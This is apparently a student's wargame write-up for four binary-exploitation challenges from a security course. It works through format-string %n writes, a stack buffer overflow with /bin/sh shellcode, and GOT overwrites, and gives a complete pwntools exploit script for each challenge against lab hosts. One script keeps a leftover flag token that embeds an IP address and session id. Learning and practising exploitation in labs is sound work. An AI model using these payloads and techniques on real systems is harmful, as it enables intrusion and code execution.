door
===========================
Flag: FLAG{}
General overview of problems faced
-------------------------------------
I was generally pretty comfortable with format strings from COMP6841 and the only added thing was %n. So for the most part the challenge was straightforward with minor exceptions and blank moments.
- Handling writing a value lower than the previous write: solved after discovering the method of overflowing to the next bit
- Was initially writing the "APES" backwards to try and account for little-endianness until I realised that was wrong. Just a mindblank.

Script/Command used (Writeup)
------------------
We enter APplES as per the program's instructions and nothing happens (surprise surprise). Entering a simple format string '%x' prints some hex value so we know there's a format string vulnerability.
Entering '%x' 50 times results in `25fd4d24 78252078 20782520 25207825 78252078` and so on. '%' in ascii is 0x25, ' ' is 0x20 and 'x' is 0x78 so it's clear that these values being printed off the stack, is the string that we entered into the buffer.
We add AAAA to the front of our input and we get `AAAA41fa4d24 25414141 78252078 20782520`. Ideally we want to fix this alignment so we have a whole 4 bytes of contiguous A's on the stack so we'll add AAAAA instead to get `AAAAA 41f41d24 41414141 20782520 25207825`.
So the data after the A's starts at stack offset 3.

Now, we look at the `main` function and notice a `strcmp` some time after we enter our input (which uses `fgets` so no buffer overflow)
```
push    0x4
lea     eax, [ebp-0x9 {var_d}]
push    eax {var_d} {var_218_1}
lea     eax, [ebx-0x15c6]  {data_9f6, "APES"}
push    eax  {data_9f6, "APES"}
call    strncmp
```
So the string "APES" is compared to the data at ebp-0x9. If we go to the beginning of `main` we see this is the address that was printed out:
```
lea     eax, [ebp-0x9 {var_d}]
push    eax {var_d} {var_214}
lea     eax, [ebx-0x16f8]  {data_8c4, "A landslide has blocked the way …"}
push    eax  {data_8c4, "A landslide has blocked the way …"}
```
So, we just need to write "APES" to the address we are given:
```
from pwn import *

# returns the number of bytes needed to write
# for a correct %n exploit. it handles the case
# when an overflow is needed.
def get_n(new, prev, size):
    while new <= prev:
        new += (1 << size)
    return new-prev

p = remote('plsdonthaq.me', 4001)

p.recvuntil('the way at ')
target_addr = int(p.recvline().rstrip(), 16)

payload = b'AAAAA'
payload += p32(target_addr)
payload += p32(target_addr + 1)
payload += p32(target_addr + 2)
payload += p32(target_addr + 3)

setup_len = len(payload)

n_val = [setup_len]
n_val += [get_n(u8('A'), sum(n_val[:1]), 8)]
n_val += [get_n(u8('P'), sum(n_val[:2]), 8)]
n_val += [get_n(u8('E'), sum(n_val[:3]), 8)]
n_val += [get_n(u8('S'), sum(n_val[:4]), 8)]

# our inputted address start at stack offset 3
payload += '%{}c'.format(n_val[1]).encode()
payload += b'%3$hhn'
payload += '%{}c'.format(n_val[2]).encode()
payload += b'%4$hhn'
payload += '%{}c'.format(n_val[3]).encode()
payload += b'%5$hhn'
payload += '%{}c'.format(n_val[4]).encode()
payload += b'%6$hhn'

p.sendline(payload)
```

snake
===========================
Flag: FLAG{}
General overview of problems faced
-------------------------------------
- Getting the address of the name buffer, given the leaked address: I actually got quite close, having accounted for the new stack frame. But I had forgotten about the pushed eip before the actual jump to `get_name`, so I was off by 4.

Script/Command used (Writeup)
------------------

```
push    eax {var_78_1}
push    0x63 {var_7c}
lea     eax, [ebp-0x70 {var_74}]
push    eax {var_74} {var_80_1}
call    fgets
add     esp, 0xc
lea     eax, [ebp-0x70 {var_74}]
push    eax {var_74} {var_78_2}
call    strlen
add     esp, 0x4
cmp     eax, 0x50
jbe     0x952
```
In `read_option` there is a check if length of our specified password is less than or equal to 50. If it is, there is a fail message, otherwise there is an attempt to print the flag. Notice the buffer used in fgets is at ebp-0x70, which is also where the esp is (at the beginning, after ebp is put in esp, there are 2 pushes so -8 and a sub of -0x68).
```
lea     eax, [ebx-0x14b9]  {data_af3, "printing flag..."}
push    eax {var_78}  {data_af3, "printing flag..."}
call    puts
add     esp, 0x4
lea     eax, [ebp-0xc {var_10}]
push    eax {var_10} {var_78_3}
lea     eax, [ebx-0x14a8]  {data_b04, "Error occurred while printing fl…"}
push    eax {var_7c}  {data_b04, "Error occurred while printing fl…"}
call    printf
```
Although we don't get a flag, what we do get is a stack address, which is the address ebp-0xc. We can use this in a buffer overflow attack to return to some shellcode that we'll place in the buffer.

However we can't overwrite the return address in `read_option`. However we can try in `get_name` since it uses a call to `gets`.
```
lea     eax, [ebp-0x32 {var_36}]
push    eax {var_36} {var_3c}
call    gets
```
So now we just need to put padding data between ebp-0x32 and ebp+0x4 and then we can replace the return address with the buffer address containing our shellcode. This would be the payload:
```
shellcode = asm(""" xor eax, eax
                    xor ecx, ecx
                    xor edx, edx
                    push ecx
                    push 0x68732f2f
                    push 0x6e69622f
                    mov al, 0x0b
                    mov ebx, esp
                    int 0x80 """)

padding = b'A'*(0x32 + 0x4 - len(shellcode)) # from ebp-0x32 to ebp+0x4

payload = shellcode + padding + p32(buffer_addr)
```
So this will replace the return address with the address of the buffer containing the shellcode. But. Where is this buffer relative to the address we leaked?
We received ebp-0xc, so we add 0xc to get the ebp value used during the lifetime of the `read_option` function. As noted earlier the esp is at ebp-0x70, so we subtract 0x70. Now when `get_name` is called, the eip (return address) is pushed onto the stack and so is the ebp. So this is another 0x8 subtracted from esp before its value is moved into `get_name`'s ebp. We know the buffer is at ebp-0x32 so subtract 0x32 and we now have the address of the buffer.
Exploit:
```
from pwn import *

p = remote('plsdonthaq.me', 4002)

p.recvuntil('> ')
p.sendline('3')

# dummy data to satisfy the >= 0x50 strlen check
p.sendline(b'A'*0x50)

p.recvuntil('at offset ')
read_option_ebp_0xc = int(p.recvline().rstrip(), 16)
read_option_ebp = read_option_ebp_0xc + 0xC
read_option_esp = read_option_ebp - 0x70 # 0x70 is size of stack frame
get_name_ebp = read_option_esp - 0x8 # account for push eip and push ebp
get_name_buffer = get_name_ebp - 0x32 # buffer is at ebp-0x32

p.sendline('1')

# taken from my war3 shellz solution
shellcode = asm(""" xor eax, eax
                    xor ecx, ecx
                    xor edx, edx
                    push ecx
                    push 0x68732f2f
                    push 0x6e69622f
                    mov al, 0x0b
                    mov ebx, esp
                    int 0x80 """)

padding = b'A'*(0x32 + 0x4 - len(shellcode)) # from ebp-0x32 to ebp+0x4
bof_payload = shellcode + padding + p32(get_name_buffer)
print(hex(get_name_buffer))

p.sendline(bof_payload)

p.interactive()
```

formatrix
===========================
Flag: FLAG{}
General overview of problems faced
-------------------------------------
- Incorrect write of the last byte: Initially I was using %x with a width modifier to increase the "number of bytes written so far". The last byte of data to write required 4 more byte to have been written first. Given a hex value off the stack if 4 bytes I thought %x would work but for some reason I kept getting an incorrect value getting written. At the time I solved this using %c but the actual cause of the problem was my check for whether to overflow when writing in `get_n` was off by 4.

Script/Command used (Writeup)
------------------
Running `checksec` reveals there is no RELRO and no PIE enabled.
We test for a format string vulnerability and find there is one, and there is a nice 4 byte alignment:
```
You say: AAAA %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x
AAAA f7ead580 804858c 41414141 65376620 38356461 30382030 38353834 31342063 31343134 36203134 36373335 20303236 35333833 31363436 33303320 33303238 38332030 38333533 33203433 32343331 20333630 34333133 34333133 32363320
```
So if we get rid of the A's whatever we input will start at stack offset 3. Let's look at `main`:
```
push    eax {var_618}
push    0x200
lea     eax, [ebp-0x208 {var_210}]
push    eax {var_210} {var_620_2}
call    fgets
add     esp, 0x10
sub     esp, 0x8
lea     eax, [ebp-0x208 {var_210}]
push    eax {var_210} {var_61c}
lea     eax, [ebp-0x608 {var_610}]
push    eax {var_610} {var_620_3}
call    sprintf
```

After `fgets` is called, `sprintf` is used (source of format string vuln). Shortly after `printf` is also called. Since there is no RELRO or PIE we can overwrite the GOT. We can use `sprintf` to run our exploit and overwrite the GOT entry for `printf` since by then we don't care about it. Conveniently there is a `win` function for us to use.
In binary ninja we find that the GOT entry for `printf` is at address `0x08049c18`.
Exploit:
```
from pwn import *

def get_n(new, prev, size):
    while new <= prev:
        new += (1 << size)
    return new-prev

def gen_addrs(base_addr):
    addrs = b''
    for i in range(4):
        addrs += p32(base_addr + i)
    return addrs

def gen_format_writes(to_write, setup_len, stack_offset):
    payload = b''
    n_val = [setup_len]
    for i in range(4):
        n_val += [get_n(to_write[i], sum(n_val[:i+1]), 8)]
        payload += '%{}c'.format(n_val[i+1]).encode()
        payload += '%{}$hhn'.format(stack_offset + i).encode()
    return payload

p = remote('plsdonthaq.me', 4003)

printf_got_addr = 0x08049c18
win_addr = [c for c in p32(0x08048536)]
print(win_addr)

payload = gen_addrs(printf_got_addr)

setup_len = len(payload)

payload += gen_format_writes(win_addr, setup_len, 3)

print(payload)

p.sendline(payload)

p.interactive()
```

sploitwarz
===========================
Flag: FLAG{}
General overview of problems faced
-------------------------------------
Having had practice with calculating offsets from a leaked address and format string exploits, I don't think the exploit making for this challenge was that hard. For me what was really hard was finding a vulnerability in a large(r) code base and not getting distracted by confusing details. I initially had no clue where to even begin. When I started to gain some clarity I came to realise I just had to look for a single printf reference that took in only 1 argument which was user defined input (which was in `do_gamble`). But then I got confused by all the complexities of the floating point manipulations.
Eventually I remembered what Adam said in a lecture: don't look at the individual instruction but look at whole chunks of code and what they mean. Given the function is `do_gamble` I used a script to automate the gamble attempts and as expected eventually the would be a success and the vulnerable `printf` is reached.

Script/Command used (Writeup)
------------------
We identify a vulnerability in the `do_gamble` function after a successful gamble:
```
sub     esp, 0xc
lea     eax, [ebx-0x179b]  {data_1d7d, "Well done, "}
push    eax  {data_1d7d, "Well done, "}
call    printf
add     esp, 0x10
mov     eax, dword [ebp+0x8 {arg1}]
add     eax, 0x14
sub     esp, 0x4
push    0x100 {var_248+0x4}
push    eax {var_248}
lea     eax, [ebp-0x234 {var_238}]
push    eax {var_238} {var_24c_1}
call    strncpy
add     esp, 0x10
sub     esp, 0xc
lea     eax, [ebp-0x234 {var_238}]
push    eax {var_238} {var_24c_2}
call    printf
add     esp, 0x10
```
This last `printf` is the only one in the binary with a format string vulnerability, since it takes only a string as a parameter. This string is at ebp-0x234. From the above `strncpy`, 0x100 bytes are copied from some (arg1+0x14) into ebp-0x234. Let's see what this arg1 is when `do_gamble` is executed from the `game_loop` function:
```
{Case 0x5}
sub     esp, 0xc
lea     eax, [ebx+0x208]  {g_player}
push    eax {var_2c}  {g_player}
call    do_gamble
```
It some chunk of memory labelled g_player which is at ebx+0x208. Note that since PIE is enabled the whole binary is shifted by some value determined at runtime. ebx contains a constant 0x3518 which is an offset from the start of the binary (notably where the GOT starts).
If we take a look at where the player's name is entered, it is at g_player+0x14, which means the vulnerable `printf` is responsible for printing the player's name.
```
push    0xff {var_38}
lea     eax, [ebx+0x208]
lea     eax, [eax+0x14]  {data_3734}
push    eax  {data_3734}
call    get_str
```
If we look back at the first snippet in this writeup from `do_gamble`, the first value to be printed off the stack is `push    eax {var_248}` which is `g_player + 0x14`. So we can retrieve this value when our name is simply '%x'. Then its obvious we can change our name to a format string exploit which writes bytes, then enter `do_gamble` again to run the exploit.
`checksec` shows there is no RELRO but there is PIE enabled. This means we can overwrite the GOT. So we'll write the `win` address to the GOT entry for `printf`. But. Since PIE is enabled we have to use the address we are given (g_player + 0x14), to work out where the `printf` GOT entry is and what the `win` address is. Let's begin the derivation for the `printf` GOT entry:
```
g_player_addr = given address - 0x14, as previously established
ebx = g_player_addr - 0x208, as we found g_player_addr to be ebx+0x208
printf GOT address = ebx + 0x10, which can be easily found on binary ninja
```

To get the `win` address, we need to make use of the fact that ebx contains the binary offset for the GOT, which is 0x3518. Inspection of the binary also reveals that the `win` function is at the binary offset 0x0ab4. So the `win` address is: ebx - 0x3518 + 0x0ab4

And with that sorted, the exploit:

```
from pwn import *

#flag is FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoid2FyNC1zcGxvaXR3YXJ6IiwiaXAiOiIxMjAuODguMTI5LjI1MCIsInNlc3Npb24iOiJiNzFmNDUzMy1mNjNlLTQ5MTItOWE0YS01MmM4ZWQ5YjJkMzkifQ.8cbwoYKNJpNGGs5P6A1WwtON2C3mE7knNzKy_DtT5DU}

def get_n(new, prev, size):
    while new <= prev:
        new += (1 << size)
    return new-prev

def gen_addrs(base_addr):
    addrs = b''
    for i in range(4):
        addrs += p32(base_addr + i)
    return addrs

def gen_format_writes(to_write, setup_len, stack_offset):
    payload = b''
    n_val = [setup_len]
    for i in range(4):
        n_val += [get_n(to_write[i], sum(n_val[:i+1]), 8)]
        payload += '%{}c'.format(n_val[i+1]).encode()
        payload += '%{}$hhn'.format(stack_offset + i).encode()
    return payload

# repeatedly gambles until there is a success
def gamble(should_return):
    while True:
        p.recvuntil("will you do? ")
        p.sendline('g')
        p.recvuntil('): ')
        p.sendline('0.01')
        p.recvuntil('> ')
        p.sendline('3')
        p.recvline()
        data = p.recv(4).decode()
        if data == 'Well':
            if not should_return:
                break
        data += p.recvline().decode()
        // find the stack value printed out
        match = re.search(r'0x[\da-f]+', data)
        if match:
            print(data)
            return(match.group())
            break
        else:
            print('f')
            p.send('f')

p = remote('plsdonthaq.me', 4004)

p.sendline(b'{0x%x}')

g_player_addr = int(gamble(True), 16)-0x14 # this address is ebx+0x208
ebx = g_player_addr - 0x208
printf_got_addr = ebx + 0x10 # printf got @ ebx+0x10
# note that ebx contains binary offset 0x3518
# win function is at binary offset 0x0ab4
win_addr = ebx - 0x3518 + 0x0ab4
win_addr = [c for c in p32(win_addr)]

p.send('y')
p.recvuntil("will you do? ")
p.sendline('c')
p.recvuntil("new handle? ")

payload = gen_addrs(printf_got_addr)
setup_len = len(payload)
payload += gen_format_writes(win_addr, setup_len, 5)

p.sendline(payload)
gamble(False)

p.interactive()

```
